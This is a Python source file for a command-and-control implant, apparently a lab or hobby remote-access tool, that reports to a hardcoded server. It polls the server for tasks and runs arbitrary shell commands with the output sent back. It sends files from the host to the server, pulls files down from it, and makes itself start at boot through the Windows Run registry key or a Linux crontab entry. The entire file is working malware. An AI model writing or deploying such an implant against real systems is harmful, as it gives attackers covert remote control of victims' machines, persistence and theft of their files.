# agent.py
import requests # type: ignore
from requests.adapters import HTTPAdapter # type: ignore
from urllib3.util.retry import Retry # type: ignore
import subprocess
import platform
import os
import time
import psutil  # type: ignore # For sysinfo
import socket  # <-- added for getting system hostname automatically

SERVER_URL = "http://192.168.56.1:5000"  # HTTP to match server config

# Automatically use device hostname as agent ID
AGENT_ID = socket.gethostname()  # <-- changed here
OS_TYPE = platform.system()
CWD = os.getcwd()

# Session with retries and timeouts
session = requests.Session()
retry_strategy = Retry(total=5, backoff_factor=1, status_forcelist=[502, 503, 504])
session.mount('http://', HTTPAdapter(max_retries=retry_strategy))

COMMAND_MAP = {
    "Windows": {"ls": "dir", "pwd": "cd", "ifconfig": "ipconfig"},
    "Linux": {"dir": "ls", "cd": "pwd", "ipconfig": "ifconfig"},
}

def translate_command(cmd):
    return COMMAND_MAP.get(OS_TYPE, {}).get(cmd, cmd)

def get_task():
    try:
        res = session.get(f"{SERVER_URL}/get_task/{AGENT_ID}", timeout=(10, 30))
        if res.status_code == 200:
            return res.json()
    except requests.exceptions.RequestException as e:
        print(f"[Agent Error] Failed to get task: {e}")
    return None

def send_report(task_id, result, cwd):
    try:
        session.post(f"{SERVER_URL}/report/{AGENT_ID}", json={
            "task_id": task_id,
            "result": result,
            "cwd": cwd
        }, timeout=(10, 30))
        print(f"[Agent] Report sent for task {task_id}: {result}")
    except requests.exceptions.RequestException as e:
        print(f"[Agent Error] Could not send report: {e}")

def register():
    try:
        session.post(f"{SERVER_URL}/register", json={
            "agent_id": AGENT_ID,
            "os": OS_TYPE,
            "cwd": CWD
        }, timeout=(10, 30))
        print(f"[Agent] Registered automatically as {AGENT_ID} ({OS_TYPE}) [cwd: {CWD}]")
    except requests.exceptions.RequestException as e:
        print(f"[Agent Error] Registration failed: {e}. Check if server is running on {SERVER_URL}.")

def handle_upload(task):
    _, server_path, remote_filename = task.split()
    try:
        res = session.get(f"{SERVER_URL}/uploads/{os.path.basename(server_path)}", timeout=(10, 30))
        with open(os.path.join(CWD, remote_filename), 'wb') as f:
            f.write(res.content)
        return f"File uploaded to {CWD}/{remote_filename}"
    except Exception as e:
        return f"[Upload Error] {e}"

def handle_download(task):
    _, remote_path, _ = task.split()
    try:
        with open(remote_path, 'rb') as f:
            files = {'file': f}
            session.post(f"{SERVER_URL}/downloads/{AGENT_ID}/{os.path.basename(remote_path)}", files=files, timeout=(10, 30))
        return f"File {remote_path} sent to server for download"
    except Exception as e:
        return f"[Download Error] {e}"

def handle_persist():
    if OS_TYPE == "Windows":
        try:
            import winreg, sys
            exe_path = os.path.abspath(__file__)
            # If running from Python script, wrap with Python executable
            if exe_path.endswith(".py"):
                python_path = sys.executable
                cmd = f'"{python_path}" "{exe_path}"'
            else:
                cmd = exe_path  # compiled .exe runs directly

            key = winreg.CreateKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run"
            )
            winreg.SetValueEx(key, "Agent", 0, winreg.REG_SZ, cmd)
            winreg.CloseKey(key)
            return f"Persistence added to Windows startup (command: {cmd})"
        except Exception as e:
            return f"[Persist Error] {e}"

    elif OS_TYPE == "Linux":
        try:
            new_entry = f"@reboot python3 {os.path.abspath(__file__)}\n"
            # Try to read current crontab, but ignore errors if none exists
            try:
                current_cron = subprocess.check_output(
                    "crontab -l", shell=True, stderr=subprocess.DEVNULL
                ).decode()
            except subprocess.CalledProcessError:
                current_cron = ""
            # Add new entry if not already there
            if new_entry not in current_cron:
                updated_cron = current_cron + new_entry
                subprocess.run(f'echo "{updated_cron}" | crontab -', shell=True)
            return "Persistence added to Linux crontab (will start on reboot)"
        except Exception as e:
            return f"[Persist Error] {e}"

    return "OS not supported for persistence"




def handle_sysinfo():
    try:
        info = {
            "CPU": f"{psutil.cpu_percent()}% usage",
            "RAM": f"{psutil.virtual_memory().percent}% used",
            "Processes": len(psutil.pids())
        }
        return str(info)
    except Exception as e:
        return f"[Sysinfo Error] {e}"

def main():
    global CWD
    register()

    while True:
        task_data = get_task()
        if task_data and "task" in task_data:
            task = task_data["task"]
            task_id = task_data["task_id"]
            print(f"[Agent] Task assigned: ID {task_id} - Command: {task}")

            translated = translate_command(task)

            if translated.startswith("cd "):
                try:
                    path = translated.split(" ", 1)[1]
                    os.chdir(path)
                    CWD = os.getcwd()
                    result = f"Changed directory to {CWD}"
                except Exception as e:
                    result = f"[cd Error] {e}"
            elif translated.startswith("upload "):
                result = handle_upload(translated)
            elif translated.startswith("download "):
                result = handle_download(translated)
            elif translated == "persist":
                result = handle_persist()
            elif translated == "sysinfo":
                result = handle_sysinfo()
            else:
                try:
                    proc = subprocess.Popen(
                        translated, shell=True,
                        stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
                    )
                    out, err = proc.communicate()
                    result = out + err
                except Exception as e:
                    result = f"[Exec Error] {e}"

            print(f"[Agent] Task {task_id} completed with result: {result}")
            send_report(task_id, result, CWD)
        else:
            print("[Agent] No new task assigned - polling again...")
        time.sleep(2)

if __name__ == "__main__":
    main()
